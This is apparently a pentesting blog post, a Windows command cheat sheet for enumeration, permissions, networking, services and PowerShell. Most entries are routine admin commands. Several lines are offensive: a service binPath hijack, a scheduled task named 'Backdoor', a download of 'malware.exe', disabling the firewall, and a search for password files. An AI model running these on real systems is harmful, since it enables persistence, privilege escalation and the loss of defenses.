---
title: Commands
date: 2024-08-03 12:00:00
categories:
  - Pentesting
  - Windows
tags:
  - Pentesting
  - Windows
toc: true
---

---
.

---
<!-- more -->

## General Information

### User Information
```bat
echo %username%                         REM Display the current username
whoami /all                             REM Show detailed user information, groups, privileges, and SID
net user                                REM List all user accounts on the local machine
net localgroup administrators           REM List members of the Administrators group
```
```bat
whoami /priv                            REM View privileges - look for SeImpersonaPrivilege - potato
```

<br>

### System Information
```bat
systeminfo                              REM Display detailed system configuration, OS version, etc.
wmic qfe list brief /format:table       REM List installed hotfixes and patches
wmic os get caption, version, csname    REM Display the Windows version, OS name, and computer name
wmic product get name, version          REM List all installed software with versions (useful for finding vulnerable software)
```

<br>

### Registry Information
```bat
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run               REM List programs set to run at startup
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer  REM Check proxy settings
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymous  REM Check if anonymous enumeration of SAM accounts is restricted
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  REM Check if MSI packages can be installed with elevated privileges
```

<br>

## Filesystem

## Drivers
```batch
fsutil fsinfo drives      REM View drivers available
```

### Directory and File Operations with `dir`
```bat
dir /A:D                                 REM List directories only
dir /A:HS                                REM List hidden and system files
dir /O:S                                 REM Sort files by size
dir /Q                                   REM Show file owners
dir /T:C                                 REM Show creation time
dir /S /B                                REM Recursive search, bare format (useful for finding specific files like passwords or sensitive documents)
```

<br>

### File Searching with `findstr`
```bat
findstr /si "password" *.txt             REM Search for the word "password" in all .txt files (case-insensitive)
findstr /R /S "regex_pattern" *.config   REM Search using regular expressions across all .config files recursively
```

<br>

### File and Directory Takeover
```bat
takeown /F <file_or_folder> /A           REM Take ownership of a file or folder
icacls <file_or_folder> /grant %username%:F  REM Grant full control to the current user
```

<br>

## Permissions

### `icacls` - Managing Permissions
```bat
icacls <file_or_folder>                   REM Show permissions for a file or folder
icacls <file_or_folder> /grant <user>:(F) REM Grant full control to a user
icacls <file_or_folder> /deny <user>:(D)  REM Deny delete permissions to a user
icacls <file_or_folder> /inheritance:e    REM Enable inheritance for a file or folder
icacls <file_or_folder> /save aclfile.txt REM Backup ACLs to a file
icacls <file_or_folder> /restore aclfile.txt  REM Restore ACLs from a file
icacls <file_or_folder> /reset            REM Reset permissions to default
```
```batch
F    : Full control — Grants complete access to the file or directory, including the ability to modify permissions.
M    : Modify — Allows reading, writing, and deleting the file or directory but does not include permission changes.
RX   : Read and execute — Allows reading the file and executing it (if it's executable), or listing the directory and accessing its contents.
R    : Read — Permits reading the file or listing the directory's contents.
W    : Write — Allows writing to the file or adding files to the directory.
D    : Delete — Grants the ability to delete the file or directory.
X    : Traverse — Permits moving through a directory to access other files or directories.
S    : Synchronize — Enables synchronization of operations on the file or directory, useful for process synchronization.
```

<br>

### Access Control with `accesschk`
```bat
accesschk.exe -uws <username> *           REM Show all objects with write access for a specific user (Sysinternals)
accesschk.exe -p <processname>            REM Check permissions on a specific process (useful for privilege escalation)
```

<br>

## Networking

### Network Configuration with `ipconfig`
```bat
ipconfig /all                             REM Display all network configuration
ipconfig /displaydns                      REM Show the DNS resolver cache
ipconfig /flushdns                        REM Flush DNS resolver cache (useful for clearing potential logs or testing DNS issues)
ipconfig /release                         REM Release the current IP address
ipconfig /renew                           REM Renew the IP address
```

<br>

### Network Connections with `netstat`
```bat
netstat -an                               REM Show all active connections and listening ports
netstat -b                                REM Show the executable tied to each connection
netstat -r                                REM Show the routing table
netstat -o                                REM Show active connections with the associated process ID (PID)
netstat -ano | findstr :80                REM Find connections on port 80
```

<br>

### ARP Cache with `arp`
```bat
arp -a                                    REM Show ARP cache
arp -d                                    REM Clear ARP cache
```

<br>

### Windows Firewall with `netsh`
```bat
netsh advfirewall show currentprofile     REM Display the active firewall profile settings
netsh advfirewall set currentprofile state off  REM Disable the active firewall profile (requires admin)
netsh advfirewall firewall add rule name="Allow SSH" protocol=TCP dir=in localport=22 action=allow  REM Add a firewall rule to allow SSH on port 22
```

<br>

### Shares with `net`
```bat
net share                                REM List all shared folders on the local machine
net view \\hostname                       REM List shared resources on a remote machine
net use Z: \\hostname\sharename /user:username password  REM Map a network drive using specific credentials
```

<br>

### `smbclient` for SMB Connections (from Linux/Windows with Cygwin)
```bat
smbclient -L \\hostname -U username       REM List shares on a remote SMB server
smbclient //hostname/sharename -U username  REM Connect to a specific share
```

<br>

### `powershell` Networking
```bat
powershell "Test-Connection -ComputerName hostname -Count 4"  REM Ping a host 4 times using PowerShell
powershell "Get-NetTCPConnection -State Listen"  REM List all listening ports using PowerShell
powershell "Invoke-WebRequest -Uri http://example.com"  REM Make a web request using PowerShell
```

<br>

## Services

### Service Management with `sc`
```bat
sc query <service_name>                   REM Query the status of a service
sc qc <service_name>                      REM Query the service configuration (useful for finding paths and weak permissions)
sc stop <service_name>                    REM Stop a service
sc start <service_name>                   REM Start a service
sc config <service_name> binPath= "C:\path\to\malicious.exe"  REM Change the executable path for a service (privilege escalation technique)
sc delete <service_name>                  REM Delete a service
```

<br>

### Windows Services with `wmic`

```bat
wmic service get name, displayname, startmode, state  REM List all services, their display names, start modes, and current states
wmic process where "name='svchost.exe'" get processid, commandline  REM List all instances of svchost with their command lines
```

<br>

## Task Management

### Process Management with `tasklist` and `taskkill`
```bat
tasklist                                  REM List all running processes
tasklist /svc                             REM List services hosted in each svchost process
tasklist /v                               REM Display detailed information about each process, including window title
taskkill /PID <PID>                       REM Kill a process by PID
taskkill /IM <process_name>               REM Kill a process by name
taskkill /F /PID <PID>                    REM Forcefully kill a process by PID
```

<br>

### Scheduling Tasks with `schtasks`
```bat
schtasks /query /fo LIST /v               REM List all scheduled tasks with detailed information
schtasks /create /tn "Backdoor" /tr "C:\path\to\malicious.exe" /sc daily /st 12:00  REM Create a scheduled task to run a malicious file daily at noon
schtasks /delete /tn "TaskName" /f        REM Delete a scheduled task by name, without prompting for confirmation
```

<br>

## PowerShell - Advanced Commands

### File and Directory Enumeration
```bat
Get-ChildItem -Recurse -Force | Where-Object { $_.Attributes -match "Hidden" }  REM List all hidden files recursively
Get-Acl C:\path\to\file.txt | Format-List  REM Get detailed ACL information for a specific file
```

<br>

### Downloading Files
```bat
Invoke-WebRequest -Uri http://example.com/malware.exe -OutFile C:\path\to\malware.exe  REM Download a file from a URL and save it locally
```

<br>

### Running Commands Remotely
```bat
Invoke-Command -ComputerName hostname -ScriptBlock { Get-Service }  REM Run a command on a remote computer to list services
Enter-PSSession -ComputerName hostname  REM Establish an interactive session with a remote computer
```

<br>

## Miscellaneous

### Environment Variables
```bat
set                                        REM List all environment variables
setx VAR_NAME "Value"                      REM Set a new environment variable permanently
set path=C:\newpath;%path%                 REM Temporarily modify the PATH environment variable
```

<br>

### System Control
```bat
shutdown /s /f /t 0                        REM Shutdown the computer immediately
shutdown /r /f /t 0                        REM Restart the computer immediately
```

<br>

---
---